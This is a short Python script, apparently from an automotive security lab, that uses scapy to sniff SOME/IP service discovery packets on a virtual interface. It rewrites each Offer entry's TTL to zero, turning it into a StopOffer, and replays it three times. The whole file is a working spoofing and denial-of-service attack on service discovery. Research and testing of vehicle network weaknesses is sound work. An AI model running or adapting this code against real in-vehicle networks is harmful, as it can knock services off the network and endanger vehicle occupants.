from scapy.all import *
from scapy.contrib.automotive.someip import *

import time
import pdb

#client3_mac = getmacbyip(client3_ip)
#print(f"client3_mac: {client3_mac}")

def process_packet(packet):
    if packet.haslayer(IP) and packet.haslayer(UDP):
        if packet.haslayer(SD):
            #pdb.set_trace()
            print("someip discovery!")
            # modify Offer to StopOffer by setting ttl to zero
            packet[SOMEIP][SD][SDEntry_Service].ttl = 0
            sendp(packet, iface='veth0.3', count=3)

            print("sleep 5s")
            time.sleep(5)

sniff(filter=f"udp and src host 10.0.3.2", iface='veth0.3', prn=process_packet)

